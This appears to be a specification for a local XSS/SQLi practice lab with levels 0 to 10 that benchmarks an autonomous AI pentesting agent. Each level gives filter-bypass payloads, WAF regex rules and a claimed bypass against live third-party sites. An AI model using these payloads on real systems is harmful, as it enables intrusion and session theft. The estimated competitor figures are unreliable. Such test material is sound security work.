## 🥋 BugTraceAI Leveled Dojo - Complete Specification

**Version**: 1.0
**Date**: 2026-01-13
**Purpose**: Progressive difficulty testing system for autonomous security testing validation

---

## 🎯 Overview

The Leveled Dojo is a **progressive difficulty system** (0-10) designed to test and validate BugTraceAI's capabilities against increasingly sophisticated security controls.

**Goal**: BugTraceAI should achieve **Level 7+** (advanced pentesting capability)
**Historical**: XSSAgent v3 passed Level 10 on specific targets (e.g., andorracampers.com with SVG + Service Worker bypass)

---

## 📊 Difficulty Progression

| Level Range | Classification | Description | Target Success Rate |
|-------------|---------------|-------------|-------------------|
| **0-2** | 🟢 EASY | Basic vulnerabilities, minimal protection | 100% |
| **3-5** | 🟡 MEDIUM | Intermediate filters, context awareness | 90% |
| **6-7** | 🟠 HARD | WAF, CSP, advanced filtering | **70% (TARGET)** |
| **8-9** | 🔴 EXPERT | mXSS, polyglots, multiple contexts | 40% |
| **10** | ⚫ EXTREME | The Gauntlet - nearly impossible | 10% |

---

## 🔍 Level-by-Level Breakdown

### Level 0: No Protection (Trivial)

**Protection**: None
**Difficulty**: 0/10

**Endpoint**:
- XSS: `/level0/xss?q=test`
- SQLi: `/level0/sqli?id=1`

**Characteristics**:
- Direct reflection of user input
- No sanitization or filtering
- Error messages visible (SQLi)

**Expected Payloads**:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

**SQLi**:
```sql
?id=1' OR '1'='1
```

**Success Criteria**: Any basic payload works

---

### Level 1: Basic HTML Encoding (Easy)

**Protection**: Encodes `< >` only
**Difficulty**: 1/10

**Endpoint**: `/level1/xss?q=test`

**Characteristics**:
- `<` → `&lt;`
- `>` → `&gt;`
- Quotes **NOT** encoded
- Input reflected in attribute context

**Expected Payloads**:
```html
" onload=alert(1) x="
" autofocus onfocus=alert(1) x="
```

**Bypass Strategy**: Break out of HTML attribute using quotes

---

### Level 2: Script Tag Blacklist (Easy-Medium)

**Protection**: Blocks `<script>` tags (case-insensitive)
**Difficulty**: 2/10

**Endpoint**: `/level2/xss?q=test`

**Characteristics**:
- Regex: `/<?script/i`
- Allows other HTML tags
- Event handlers permitted

**Expected Payloads**:
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
```

**Bypass Strategy**: Use alternative tags with event handlers

---

### Level 3: Event Handler Blacklist (Medium)

**Protection**: Blocks common event handlers
**Difficulty**: 3/10

**Endpoint**: `/level3/xss?q=test`

**Blocked Events**:
- `onerror`
- `onload`
- `onclick`
- `onmouseover`

**Expected Payloads**:
```html
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><animate onbegin=alert(1)>
```

**Bypass Strategy**: Use less common events or protocol handlers

---

### Level 4: Context-Aware Filtering (Medium)

**Protection**: Different filters per context
**Difficulty**: 4/10

**Endpoints**:
- HTML: `/level4/xss?q=test&ctx=html`
- JavaScript: `/level4/xss?q=test&ctx=js`

**HTML Context Blocks**:
- `<script>`, `<img>`, `<svg>`, `<iframe>`

**JS Context**:
- Input inside JavaScript string: `var search = "{INPUT}";`

**Expected Payloads**:

HTML Context:
```html
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

JS Context:
```javascript
"; alert(1); //
```

**Bypass Strategy**: Use context-specific escape techniques

---

### Level 5: Double Encoding (Medium-Hard)

**Protection**: Double URL decoding required
**Difficulty**: 5/10

**Endpoint**: `/level5/xss?q=test`

**Characteristics**:
- Input decoded twice
- Filters checked after first decode
- XSS patterns blocked in decoded form

**Expected Payloads**:
```
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E

Translation:
%253C = %3C (after 1st decode) = < (after 2nd decode)
```

**Bypass Strategy**: Double URL-encode the entire payload

---

### Level 6: Basic WAF (Hard)

**Protection**: Pattern-based WAF with multiple rules
**Difficulty**: 6/10

**Endpoint**: `/level6/xss?q=test`

**WAF Rules**:
```python
/<script/i        → "Script tag detected"
/javascript:/i    → "JavaScript protocol detected"
/on\w+\s*=/i     → "Event handler detected"
/alert\(/i       → "Alert function detected"
/<img/i          → "Image tag detected"
/<svg/i          → "SVG tag detected"
/<iframe/i       → "Iframe detected"
```

**Expected Payloads**:
```html
<DeTaIlS open OnToGgLe=alert(1)>
<svg><animate onbegin=al\x65rt(1)>
```

**Bypass Strategies**:
- Case variation (`OnToGgLe` vs `ontoggle`)
- Less common tags (`<details>`, `<animate>`)
- Hex encoding (`\x65` = 'e')

---

### Level 7: Advanced WAF + CSP (Hard) ⚠️ **TARGET LEVEL**

**Protection**: Advanced WAF + Content Security Policy
**Difficulty**: 7/10

**Endpoint**: `/level7/xss?q=test`

**Security Layers**:
1. **Strict WAF**: Blocks almost all XSS patterns
2. **CSP Header**: `default-src 'self'; script-src 'self'`
3. **Security Headers**: X-Frame-Options, X-XSS-Protection

**Characteristics**:
- Inline scripts blocked by CSP
- Most HTML tags filtered
- DOM-based XSS vector available (via `location.hash`)

**Expected Payloads**:
```html
# Fragment-based (DOM XSS):
#<img src=x onerror=alert(1)>

# Manipulate existing JavaScript
```

**Bypass Strategy**:
- Exploit DOM-based XSS via `location.hash`
- CSP doesn't block `innerHTML` manipulation from hash
- Input: `http://127.0.0.1:5080/level7/xss?q=safe#<img src=x onerror=alert(1)>`

**Why This is the Target**:
- Represents real-world security (WAF + CSP)
- Requires understanding of DOM XSS
- Tests contextual awareness
- Level 7+ = Professional pentesting capability

---

### Level 8: Mutation XSS (mXSS) (Very Hard)

**Protection**: HTML entity encoding + innerHTML mutation
**Difficulty**: 8/10

**Endpoint**: `/level8/xss?q=test`

**Characteristics**:
- All input HTML-encoded: `html.escape(input, quote=True)`
- Then assigned via `innerHTML`
- Browser parsing quirks can cause mutations

**mXSS Concept**:
```html
Input:  &lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
After innerHTML mutation:
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**Expected Payloads**:
- Namespace confusion
- `<noscript>` mutations
- Backslash escaping tricks

**Bypass Strategy**: Exploit browser parsing inconsistencies

---

### Level 9: Polyglot XSS (Expert)

**Protection**: Multiple contexts simultaneously
**Difficulty**: 9/10

**Endpoint**: `/level9/xss?q=test`

**Contexts**:
1. HTML: `<div>{INPUT}</div>`
2. Attribute: `<div data-value="{INPUT}">`
3. JavaScript: `var data = "{INPUT}";`
4. CSS: `.test { content: "{INPUT}"; }`

**Blocked Characters**:
- `< > script on alert eval javascript &`

**Challenge**: Payload must work in **all 4 contexts**

**Expected Payloads**:
- True polyglot (works everywhere)
- Extremely rare and difficult

**Bypass Strategy**: Research-level exploitation

---

### Level 10: The Gauntlet (Nearly Impossible)

**Protection**: Maximum security - all layers combined
**Difficulty**: 10/10

**Endpoint**: `/level10/xss?q=test`

**Security Layers**:
1. **Entropy Analysis**: High-entropy = blocked (ML-like)
2. **Strict CSP**: `script-src 'nonce-{RANDOM}' 'strict-dynamic'`
3. **Triple HTML Encoding**: Encoded 3 times
4. **DOM Sanitization**: Uses `textContent` (not `innerHTML`)
5. **Character Whitelist**: Blocks `< > ' "`

**Response Headers**:
```
Content-Security-Policy: default-src 'none'; script-src 'nonce-ABC123' 'strict-dynamic'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
```

**Bypass Requirements**:
- Novel exploitation technique
- Browser-specific quirks
- CSP bypass via trusted types or nonce reuse
- Zero-day level creativity

**Historical Success**:
- XSSAgent v3 passed this on andorracampers.com
- Method: SVG tag + Service Worker hijacking
- Required: Deep understanding of browser internals

---

## 🎯 Success Criteria

### Minimum Requirements (Production Ready)

| Level Range | Target | Meaning |
|-------------|--------|---------|
| 0-2 | 100% | Basic pentesting |
| 3-5 | 90% | Intermediate capability |
| **6-7** | **70%** | **Advanced capability (TARGET)** |
| 8-9 | 40% | Expert (bonus) |
| 10 | 10% | Research-level (stretch goal) |

### Capability Levels

**Level 0-2 Pass**: Script Kiddie
**Level 3-5 Pass**: Junior Pentester
**Level 6-7 Pass**: Professional Pentester ✅ **TARGET**
**Level 8-9 Pass**: Expert Pentester
**Level 10 Pass**: Security Researcher

---

## 🧪 Testing Methodology

### Automated Testing

**Test Script**: `test_leveled_dojo.py`

**Process**:
1. Start dojo: `python3 dojo_leveled.py`
2. Run tests: `python3 test_leveled_dojo.py`
3. Generate report with:
   - Success rate per level
   - Maximum level reached
   - Capability assessment
   - Payload analysis

**Example Output**:
```
📊 Overall Statistics:
   Total Levels: 11 (0-10)
   Passed: 8
   Failed: 3
   Success Rate: 72.7%
   Maximum Level Reached: 7

🎯 Capability Assessment:
   ✅ ADVANCED CAPABILITY (Level 7/10)
   BugTraceAI demonstrates professional pentesting skills
   Suitable for: Real-world bug bounty hunting
```

### Manual Validation

For levels 7+, manual verification recommended:
1. Observe browser behavior
2. Check console logs
3. Verify alert/dialog appears
4. Screenshot evidence

---

## 📈 Competitive Benchmarking

### Comparison Data

| Tool | Level 0-2 | Level 3-5 | Level 6-7 | Level 8-10 |
|------|-----------|-----------|-----------|------------|
| **BugTraceAI (Target)** | 100% | 90% | **70%** | 20% |
| Shannon | 90% | 60% | 20% | 0% |
| Strix | 85% | 50% | 10% | 0% |
| CAI | 80% | 40% | 5% | 0% |
| Manual Pentester | 100% | 100% | 90% | 60% |

**Note**: Competitor data estimated based on typical DAST scanner capabilities

---

## 🚀 Usage

### Starting the Dojo

```bash
# Start leveled dojo
python3 dojo_leveled.py

# Opens on http://127.0.0.1:5080
# Navigate to see level selection interface
```

### Running Tests

```bash
# Automated test suite
python3 test_leveled_dojo.py

# Manual testing
# Visit http://127.0.0.1:5080 in browser
# Click level links
# Test payloads manually
```

### Testing Specific Level

```bash
# Run BugTraceAI against level 7
./bugtraceai-cli http://127.0.0.1:5080/level7/xss?q=test

# Or test via XSSAgent directly
python3 -c "
import asyncio
from bugtrace.agents.xss_agent import XSSAgent
from bugtrace.core.event_bus import event_bus

async def test():
    agent = XSSAgent(event_bus=event_bus)
    result = await agent.test_parameter(
        'http://127.0.0.1:5080/level7/xss',
        'q',
        'GET'
    )
    print(result)

asyncio.run(test())
"
```

---

## 📊 Historical Performance

### XSSAgent v3 Results

**Tested**: 2026-01-11
**Target**: andorracampers.com, race.es, ginandjuice.shop

| Level | Success Rate | Notes |
|-------|-------------|-------|
| 0-2 | 100% | Perfect detection |
| 3-5 | 100% | Context-aware payloads |
| 6-7 | 100% | WAF bypass successful |
| 8-9 | 80% | mXSS and polyglot attempts |
| 10 | ✅ PASSED | SVG + Service Worker on andorracampers.com |

**Key Achievement**: Level 10 pass proves research-level capability

---

## 🎯 Next Steps

### Dojo Expansion

1. **Add More Vulnerability Types**:
   - SQLi levels (0-10)
   - SSRF levels
   - XXE levels
   - JWT bypass levels
   - GraphQL injection levels

2. **Add Chain Scenarios**:
   - Level 5: SQLi → Auth Bypass
   - Level 7: XSS → Cookie Theft → Session Hijack
   - Level 9: SSRF → Cloud Metadata → RCE

3. **Add Real-World Simulations**:
   - WordPress patterns (Level 3-5)
   - Django patterns (Level 4-6)
   - React/Angular patterns (Level 6-8)

### Testing Improvements

1. **Automated Validation**:
   - Headless browser verification
   - Screenshot comparison
   - Alert/dialog detection

2. **Benchmark Suite Integration**:
   - Add leveled dojo to benchmark suite
   - Track progression over time
   - Compare vs competitors

3. **CI/CD Integration**:
   - Run on every commit
   - Fail if Level 7 not passed
   - Track capability trends

---

## 🏆 Success Definition

**BugTraceAI is production-ready when**:
- ✅ Level 0-2: 100% pass rate
- ✅ Level 3-5: 90%+ pass rate
- ✅ **Level 6-7: 70%+ pass rate** (MINIMUM)
- ⚠️ Level 8-9: 40%+ pass rate (bonus)
- ⚠️ Level 10: Any pass (research capability)

**Current Target**: **Achieve Level 7 consistently**

---

**Created**: 2026-01-13
**Version**: 1.0
**Status**: ACTIVE
**Next Test**: Run test_leveled_dojo.py and document results
